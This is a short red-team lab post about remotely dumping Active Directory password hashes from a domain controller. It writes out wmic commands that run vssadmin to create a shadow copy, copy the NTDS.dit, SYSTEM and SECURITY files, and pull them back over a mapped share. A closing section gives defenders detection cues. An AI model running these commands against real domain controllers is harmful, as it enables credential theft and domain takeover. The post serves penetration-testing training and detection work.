---
layout: post
title: "dumping domain controller hashes via wmic and shadow copy using vssadmin"
date: 2024-06-18
categories: credential-access-and-credential-dumping
tags: redteam, mitre, killchain, offensivesecurity, cpent, cpts, oscp, exploit
permalink: /credential-access-and-credential-dumping/
---

# Dumping Domain Controller Hashes via wmic and Vssadmin Shadow Copy

This quick labs hows how to dump all user hashes from the DC by creating a shadow copy of the C drive using vssadmin - remotely.

This lab assumes the attacker has already gained administratrative access to the domain controller.

## Execution

Create a shadow copy of the C drive of the Domain Controller:

{% code title="attacker@victim" %}
```csharp
wmic /node:dc01 /user:administrator@offense /password:123456 process call create "cmd /c vssadmin create shadow /for=C: 2>&1"
```
{% endcode %}

![](<../../.gitbook/assets/Annotation 2019-05-23 213609.png>)

Copy the NTDS.dit, SYSTEM and SECURITY hives to C:\temp on the DC01:

{% code title="attacker@victim" %}
```csharp
wmic /node:dc01 /user:administrator@offense /password:123456 process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit c:\temp\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM c:\temp\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY c:\temp\"
```
{% endcode %}

Below shows the above command executed on the attacking machine (right) and the files being dumped to c:\temp on the DC01 on the left:

![](<../../.gitbook/assets/dc-dump (1).gif>)

Mount the DC01\c$\temp locally in order to retrieve the dumped files:

{% code title="attacker@victim" %}
```csharp
net use j: \\dc01\c$\temp /user:administrator 123456; dir j:\
```
{% endcode %}

![](<../../.gitbook/assets/Annotation 2019-05-23 222654.png>)

Now, of you go extracting hashes with secretsdump as shown here:

{% content-ref url="ntds.dit-enumeration.md" %}
[ntds.dit-enumeration.md](ntds.dit-enumeration.md)
{% endcontent-ref %}

## Observations

A quick note for defenders on the proces ancestry:

![](<../../.gitbook/assets/Annotation 2019-05-23 213352.png>)

and of course commandlines:

![](<../../.gitbook/assets/Annotation 2019-05-23 223432.png>)

as well as service states:

![](<../../.gitbook/assets/Annotation 2019-05-23 223157.png>)

...and of course the lateral movement piece:

![](<../../.gitbook/assets/Annotation 2019-05-23 230027.png>)

## References

[https://twitter.com/netmux/status/1123936748000690178?s=12](https://twitter.com/netmux/status/1123936748000690178?s=12)
@spotheplanet